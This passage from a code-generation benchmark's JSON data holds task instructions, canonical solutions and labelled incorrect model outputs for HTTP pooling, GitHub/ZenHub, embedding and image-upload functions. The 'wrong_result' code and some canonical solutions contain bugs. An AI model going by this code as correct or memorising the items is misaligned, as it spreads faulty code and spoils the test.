httplib_response,\n                pool=self,\n                connection=conn,\n                retries=retries,\n                **response_kw\n            )\n\n            return response\n\n        except (TimeoutError, HTTPException, SocketError, ProtocolError,\n                BaseSSLError, SSLError) as e:\n            if isinstance(e, (BaseSSLError, CertificateError)):\n                e = SSLError(e)\n            elif isinstance(e, (SocketError, NewConnectionError)) and self.proxy:\n                e = ProxyError('Cannot connect to proxy.', e)\n            elif isinstance(e, (SocketError, HTTPException)):\n                e = ProtocolError('Connection aborted.', e)\n\n            retries = retries.increment(method, url, error=e, _pool=self)\n            retries.sleep()\n            return self.urlopen(\n                method, url, body, headers,\n                retries=retries, redirect=redirect,\n                timeout=timeout, **response_kw\n            )\n\n    def close(self):\n        while True:\n            try:\n                conn = self.pool.get(block=False)\n                if conn:\n                    conn.close()\n            except queue.Empty:\n                break",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport http.client\nimport queue\nimport threading\nfrom urllib.parse import urlparse\nfrom time import time\n\n\nclass Timeout:\n    DEFAULT_TIMEOUT = 60.0\n\n    def __init__(self, connect=None, read=None, total=None):\n        self.connect = connect or total\n        self.read = read or total\n        self.total = total\n\n\nclass Retry:\n\n    def __init__(self, total=3, connect=None, read=None, redirect=False, status=False):\n        self.total = total\n        self.connect = connect\n        self.read = read\n        self.redirect = redirect\n        self.status = status\n\n\nclass HTTPConnectionPool:\n\n    def __init__(self, host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT,\n                 maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw):\n        self.scheme = 'http'\n        self.ConnectionCls = http.client.HTTPConnection\n        self.host = host\n        self.port = port\n        self.timeout = timeout if isinstance(timeout, Timeout) else Timeout(timeout)\n        self.retries = retries\n        self.pool = queue.LifoQueue(maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.conn_kw = conn_kw\n        self.headers = headers or {}\n\n    def _new_conn(self):\n        conn = self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect,\n            **self.conn_kw\n        )\n        return conn\n\n    def _get_conn(self, timeout=None):\n        try:\n            conn = self.pool.get(block=self.block, timeout=timeout)\n        except queue.Empty:\n            conn = self._new_conn()\n        return conn\n\n    def _put_conn(self, conn):\n        try:\n            self.pool.put_nowait(conn)\n        except queue.Full:\n            pass\n\n    def _make_request(self, conn, method, url, timeout=None, **httplib_request_kw):\n        conn.request(method, url, **httplib_request_kw)\n        response = conn.getresponse()\n        return response\n\n    def urlopen(self, method, url, body=None, headers=None, retries=None, redirect=True, timeout=None, **response_kw):\n        headers = headers or self.headers\n        retries = retries or self.retries\n        conn = None\n        while True:\n            try:\n                conn = self._get_conn(timeout)\n                start_time = time()\n                resp = self._make_request(conn, method, url, timeout=timeout)\n                elapsed = time() - start_time\n                if timeout is not None and elapsed > timeout:\n                    raise Exception(\"Request timed out\")\n                return resp\n            except Exception as e:\n                if retries and retries.total > 0:\n                    retries.total -= 1\n                    if conn:\n                        self._put_conn(conn)\n                else:\n                    raise e\n\n    def close(self):\n        while not self.pool.empty():\n            try:\n                conn = self.pool.get_nowait()\n                conn.close()\n            except queue.Empty:\n                break\n```"
  },
  {
    "Task_id": 92,
    "Instruction": "Task Description: Create a Python function to interact with GitHub and ZenHub APIs to retrieve repository, board, and issue information.\n\nFunction Description: The function will make HTTP requests to GitHub and ZenHub APIs to fetch specific data about repositories, boards, and issues. It handles authentication, sends requests, checks responses, and returns the parsed data.\n\nInput:\n- github_token: [str] - GitHub personal access token for authentication\n- github_org: [str] - GitHub organization name\n- github_repo: [str] - GitHub repository name\n- zenhub_token: [str] - ZenHub API token for authentication\n- issue_number: [int] - GitHub issue number to query (for issue-related functions)\n\nOutput:\n- For get_github_repo_id: [int] - Returns the GitHub repository ID\n- For get_zenhub_board: [dict] - Returns the ZenHub board data as a dictionary\n- For get_github_issue: [dict] - Returns GitHub issue data as a dictionary\n- For get_zenhub_issue_info: [dict] - Returns ZenHub issue information as a dictionary\n\nMethods:\n1. get_github_repo_id(github_token, github_org, github_repo) -> int - Retrieves the repository ID from GitHub API\n2. get_zenhub_board(zenhub_token, github_repo_id) -> dict - Fetches ZenHub board data for a given repository ID\n3. get_github_issue(github_token, github_org, github_repo, issue_number) -> dict - Gets GitHub issue details\n4. get_zenhub_issue_info(zenhub_token, github_repo_id, issue_number) -> dict - Retrieves ZenHub-specific issue information",
    "Canonical_solution": "import requests\nimport os\n\nGITHUB_API_URL = \"https://api.github.com\"\nGITHUB_GRAPHQL_URL = \"https://api.github.com/graphql\"\nZENHUB_API_URL = \"https://api.zenhub.com/p1/repositories/{repo_id}/board\"\n\ndef get_github_repo_id(github_token, github_org, github_repo):\n    url = f\"{GITHUB_API_URL}/repos/{github_org}/{github_repo}\"\n    headers = {\n        \"Authorization\": github_token\n    }\n\n    response = requests.get(url, headers=headers)\n    if response.status_code == 200:\n        return response.json().get(\"id\")\n    else:\n        response.raise_for_status()\n\ndef get_zenhub_board(zenhub_token, github_repo_id):\n    url = ZENHUB_API_URL.format(repo_id=github_repo_id)\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"X-Authentication-Token\": zenhub_token\n    }\n\n    response = requests.get(url, headers=headers)\n    if response.status_code == 200:\n        return response.json()\n    else:\n        response.raise_for_status()\n\ndef get_github_issue(github_token, github_org, github_repo, issue_number):\n    url = f\"https://api.github.com/repos/{github_org}/{github_repo}/issues/{issue_number}\"\n    headers = {\n        \"Authorization\": f\"token {github_token}\",\n        \"Accept\": \"application/vnd.github.v3+json\"\n    }\n\n    response = requests.get(url, headers=headers)\n    if response.status_code == 200:\n        return response.json()\n    else:\n        response.raise_for_status()\n\ndef get_zenhub_issue_info(zenhub_token, github_repo_id, issue_number):\n    url = f\"https://api.zenhub.com/p1/repositories/{github_repo_id}/issues/{issue_number}\"\n    headers = {\n        \"X-Authentication-Token\": zenhub_token,\n        \"Accept\": \"application/json\"\n    }\n\n    response = requests.get(url, headers=headers)\n    if response.status_code == 200:\n        return response.json()\n    elif response.status_code == 403:\n        print(\"Rate limit exceeded. Sleeping for 1 minute\")\n    else:\n        response.raise_for_status()",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\n\ndef get_github_repo_id(github_token, github_org, github_repo):\n    headers = {\n        \"Authorization\": f\"token {github_token}\",\n        \"Accept\": \"application/vnd.github.v3+json\"\n    }\n    url = f\"https://api.github.com/repos/{github_org}/{github_repo}\"\n    response = requests.get(url, headers=headers)\n    response.raise_for_status()\n    return response.json()[\"id\"]\n\ndef get_zenhub_board(zenhub_token, github_repo_id):\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"X-Authentication-Token\": zenhub_token\n    }\n    url = f\"https://api.zenhub.com/p2/repositories/{github_repo_id}/board\"\n    response = requests.get(url, headers=headers)\n    response.raise_for_status()\n    return response.json()\n\ndef get_github_issue(github_token, github_org, github_repo, issue_number):\n    headers = {\n        \"Authorization\": f\"token {github_token}\",\n        \"Accept\": \"application/vnd.github.v3+json\"\n    }\n    url = f\"https://api.github.com/repos/{github_org}/{github_repo}/issues/{issue_number}\"\n    response = requests.get(url, headers=headers)\n    response.raise_for_status()\n    return response.json()\n\ndef get_zenhub_issue_info(zenhub_token, github_repo_id, issue_number):\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"X-Authentication-Token\": zenhub_token\n    }\n    url = f\"https://api.zenhub.com/p1/repositories/{github_repo_id}/issues/{issue_number}\"\n    response = requests.get(url, headers=headers)\n    response.raise_for_status()\n    return response.json()\n```"
  },
  {
    "Task_id": 97,
    "Instruction": "Task Description: Create a function that retrieves word embeddings from either a local API or OpenAI's API, depending on the specified model.\n\nFunction Description: The function `get_embedding_from_api` fetches a word embedding (vector representation) for a given word using either a local HTTP API or OpenAI's API. It handles both types of API calls, processes the response, and returns the embedding as a NumPy array. If the request fails, it prints an error message and returns None.\n\nInput:  \n- `word` (str): The word or text to generate an embedding for.  \n- `model` (str, optional): The name of the model to use for generating embeddings. Defaults to \"vicuna-7b-v1.5\".  \n\nOutput:  \n- `numpy.ndarray` or `None`: Returns the word embedding as a NumPy array if successful; otherwise, returns None.  \n\nNote: The function assumes the local API endpoint is running at `http://localhost:8000/v1/embeddings` and expects a JSON payload with `model` and `input` fields. For OpenAI's API, it assumes the `openai` library is properly configured.",
    "Canonical_solution": "import json\nimport requests\nimport numpy as np\n\ndef get_embedding_from_api(word, model=\"vicuna-7b-v1.5\"):\n    if \"ada\" in model:\n        resp = openai.Embedding.create(\n            model=model,\n            input=word,\n        )\n        embedding = np.array(resp[\"data\"][0][\"embedding\"])\n        return embedding\n\n    url = \"http://localhost:8000/v1/embeddings\"\n    headers = {\"Content-Type\": \"application/json\"}\n    data = json.dumps({\"model\": model, \"input\": word})\n\n    response = requests.post(url, headers=headers, data=data)\n    if response.status_code == 200:\n        embedding = np.array(response.json()[\"data\"][0][\"embedding\"])\n        return embedding\n    else:\n        print(f\"Error: {response.status_code} - {response.text}\")\n        return None",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nimport numpy as np\nimport openai\n\ndef get_embedding_from_api(word, model=\"vicuna-7b-v1.5\"):\n    if model == \"openai\":\n        try:\n            response = openai.Embedding.create(input=word, model=\"text-embedding-ada-002\")\n            embedding = np.array(response[\"data\"][0][\"embedding\"])\n            return embedding\n        except Exception as e:\n            print(f\"OpenAI API request failed: {e}\")\n            return None\n    else:\n        url = \"http://localhost:8000/v1/embeddings\"\n        payload = {\"model\": model, \"input\": word}\n        try:\n            response = requests.post(url, json=payload)\n            response.raise_for_status()\n            embedding = np.array(response.json()[\"embedding\"])\n            return embedding\n        except Exception as e:\n            print(f\"Local API request failed: {e}\")\n            return None\n```"
  },
  {
    "Task_id": 98,
    "Instruction": "Task Description: Create a function to fetch all repositories from a GitHub organization using the GitHub API.\n\nFunction Description: The function `fetch_github_repos` asynchronously retrieves all repositories belonging to a specified GitHub organization. It handles pagination to ensure all repositories are fetched, even if they span multiple pages. The function uses the GitHub REST API with proper authentication and headers.\n\nInput:\n- `org_name` (str): The name of the GitHub organization whose repositories are to be fetched.\n- `token` (str): A GitHub personal access token for authentication.\n\nOutput:\n- Returns a list of dictionaries, where each dictionary represents a repository from the organization. Returns an empty list if the request fails or no repositories are found.",
    "Canonical_solution": "import requests\ntoken = \"YOUR_GITHUB_TOKEN\"\n\nasync def fetch_github_repos(org_name, token):\n    url = f\"https://api.github.com/orgs/{org_name}/repos\"\n    headers = {\n        \"Accept\": \"application/vnd.github+json\",\n        \"Authorization\": f\"Bearer {token}\",\n        \"X-GitHub-Api-Version\": \"2022-11-28\",\n    }\n\n    params = {\n        \"per_page\": 100  # You can adjust this number (max is 100)\n    }\n\n    all_repos = []\n\n    while url:\n        response = requests.get(url, headers=headers, params=params)\n\n        if response.status_code == 200:\n            repos = response.json()\n            all_repos.extend(repos)\n\n            # Check if there is a 'next' page\n            if \"next\" in response.links:\n                url = response.links[\"next\"][\"url\"]\n            else:\n                url = None\n        else:\n            print(\n                f\"Failed to fetch repositories: {response.status_code} - {response.text}\"\n            )\n            break\n\n    return all_repos",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport aiohttp\nimport asyncio\n\nasync def fetch_github_repos(org_name, token):\n    repos = []\n    headers = {\n        \"Authorization\": f\"token {token}\",\n        \"Accept\": \"application/vnd.github.v3+json\",\n        \"User-Agent\": \"PythonScript\"\n    }\n    page = 1\n    per_page = 100\n\n    async with aiohttp.ClientSession() as session:\n        while True:\n            url = f\"https://api.github.com/orgs/{org_name}/repos?page={page}&per_page={per_page}\"\n            async with session.get(url, headers=headers) as response:\n                if response.status == 200:\n                    data = await response.json()\n                    if not data:\n                        break\n                    repos.extend(data)\n                    page += 1\n                else:\n                    break\n    return repos\n```"
  },
  {
    "Task_id": 99,
    "Instruction": "Task Description: Create a function to convert a PyTorch tensor to a base64-encoded PNG image and upload it to a specified image hosting service (either SM.MS or imgbb.com) using their respective APIs, returning the hosted image URL.\n\nFunction Description: The function should accept a PyTorch tensor and an API key, convert the tensor to a PNG image, encode it in base64, and upload it to the specified image hosting service. It should handle different response formats from the services and return the hosted image URL or an error message.\n\nInput:\n- image_tensor: torch.Tensor - A PyTorch tensor representing the image to be uploaded\n- api_key: str - The API key for authenticating with the image hosting service\n- service: str (optional) - The image hosting service to use ('smms' or 'imgbb'). Defaults to 'smms'\n\nOutput:\n- str - The URL of the uploaded image on success, or an error message string on failure\n- None - Returned when the input is not a PyTorch tensor or when the upload fails without an error message",
    "Canonical_solution": "import base64\nimport requests\nfrom io import BytesIO\nfrom PIL import Image\nimport numpy as np\nimport torch\n\ndef tensor_to_url_sm(image_tensor, api_key):\n    \"\"\"\n    \u5c06PyTorch\u5f20\u91cf\u8f6c\u6362\u4e3aPNG\u683c\u5f0f\u7684base64\u7f16\u7801\u5b57\u7b26\u4e32\u5e76\u4e0a\u4f20\u81f3SM.MS\u56fe\u5e8a\uff0c\u8fd4\u56de\u4e0a\u4f20\u540e\u7684\u56fe\u7247URL\u3002\n    \n    \u53c2\u6570:\n    - image_tensor: PyTorch\u5f20\u91cf\u3002\n    - api_key: SM.MS API\u5bc6\u94a5\u3002\n    \n    \u8fd4\u56de:\n    - \u56fe\u7247\u4e0a\u4f20\u6210\u529f\u540e\u7684URL\u6216\u5df2\u5b58\u5728\u7684\u56fe\u7247URL\uff0c\u5982\u679c\u5931\u8d25\u5219\u8fd4\u56deNone\u3002\n    \"\"\"\n    if isinstance(image_tensor, torch.Tensor):\n        i = 255.0 * image_tensor.cpu().numpy()\n    else:\n        raise TypeError(\"Input should be a PyTorch Tensor.\")\n\n    img = Image.fromarray(np.clip(i, 0, 255).astype(np.uint8))\n    buffered = BytesIO()\n    img.save(buffered, format=\"PNG\")\n    img_str = base64.b64encode(buffered.getvalue()).decode(\"utf-8\")\n\n    files = {'smfile': ('image.png', base64.b64decode(img_str), 'image/png')}\n    headers = {'Authorization': api_key}\n\n    try:\n        response = requests.post('https://sm.ms/api/v2/upload', files=files, headers=headers)\n        response.raise_for_status()\n        \n        result = response.json()\n        if result['success']:\n            return result['data']['url']\n        elif result.get('code') == 'image_repeated':\n            return result['images']\n        else:\n            print(f\"Error: {result.get('message')}\")\n            return None\n    except requests.exceptions.RequestException as e:\n        print(f\"HTTP Request Error: {e}\")\n        return None\n\ndef tensor_to_url_imgbb(image_tensor, api_key):\n    \"\"\"\n    \u5c06PyTorch\u5f20\u91cf\u8f6c\u6362\u4e3aPNG\u683c\u5f0f\u7684base64\u7f16\u7801\u5b57\u7b26\u4e32\u5e76\u4e0a\u4f20\u81f3imgbb.com\u56fe\u5e8a\uff0c\u8fd4\u56de\u4e0a\u4f20\u540e\u7684\u56fe\u7247URL\u3002\n\n    \u53c2\u6570:\n    - image_tensor: PyTorch\u5f20\u91cf\u3002\n    - api_key: imgbb.com API\u5bc6\u94a5\u3002\n\n    \u8fd4\u56de:\n    - \u56fe\u7247\u4e0a\u4f20\u6210\u529f\u540e\u7684URL\u6216\u5df2\u5b58\u5728\u7684\u56fe\u7247URL\uff0c\u5982\u679c\u5931\u8d25\u5219\u8fd4\u56deNone\u3002\n    \"\"\"\n    if isinstance(image_tensor, torch.Tensor):\n        i = 255.0 * image_tensor.cpu().numpy()\n    else:\n        raise TypeError(\"Input should be a PyTorch Tensor.\")\n\n    img = Image.fromarray(np.clip(i, 0, 255).astype(np.uint8))\n    buffered = BytesIO()\n    img.save(buffered, format=\"PNG\")\n    img_str = base64.b64encode(buffered.getvalue()).decode(\"utf-8\")\n    url = \"https://api.imgbb.com/1/upload\"\n    payload = {\"key\": api_key, \"image\": img_str}\n    response = requests.post(url, data=payload)\n    if response.status_code == 200:\n        result = response.json()\n        img_url = result[\"data\"][\"url\"]\n        return img_url\n    else:\n        return \"Error: \" + response.text",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport torch\nimport base64\nimport requests\nfrom io import BytesIO\nfrom PIL import Image\n\ndef tensor_to_image_url(image_tensor, api_key, service='smms'):\n    if not isinstance(image_tensor, torch.Tensor):\n        return None\n\n    # Convert tensor to image\n    image_tensor = image_tensor.cpu().detach()\n    if image_tensor.dim() == 3 and image_tensor.shape[0] in (1, 3):\n        if image_tensor.shape[0] == 1:\n            image_tensor = image_tensor.repeat(3, 1, 1)\n        image_tensor = image_tensor.permute(1, 2, 0)\n    elif image_tensor.dim() != 3 or image_tensor.shape[0] not in (3, 4):\n        return \"Invalid tensor shape\"\n    \n    image_tensor = (image_tensor * 255).clamp(0, 255).byte().numpy()\n    pil_image = Image.fromarray(image_tensor)\n\n    # Convert image to base64\n    buffer = BytesIO()\n    pil_image.save(buffer, format=\"PNG\")\n    img_str = base64.b64encode(buffer.getvalue()).decode(\"utf-8\")\n\n    headers = {\"Content-Type\": \"application/json\"}\n    payload = {}\n\n    if service == 'smms':\n        url = \"https://sm.ms/api/v2/upload\"\n        payload = {\n            \"base64\": img_str,\n            \"format\": \"base64\"\n        }\n    elif service == 'imgbb':\n        url = \"https://api.imgbb.com/1/upload\"\n        payload = {\n            \"image\": img_str\n        }\n    else:\n        return \"Unsupported service\"\n\n    try:\n        response = requests.post(url, data=payload, params={\"key\": api_key}, headers=headers)\n        response.raise_for_status()\n        json_response = response.json()\n\n        if service == 'smms':\n            if json_response.get('success'):\n                return json_response['data']['url']\n            else:\n                return json_response.get('message', 'Upload failed')\n        elif service == 'imgbb':\n            if json_response.get('success'):\n                return json_response['data']['url_viewer']\n            else:\n                return json_response.get('error', 'Upload failed')\n    except Exception as e:\n        return str(e)\n\n    return None\n```"
  }
]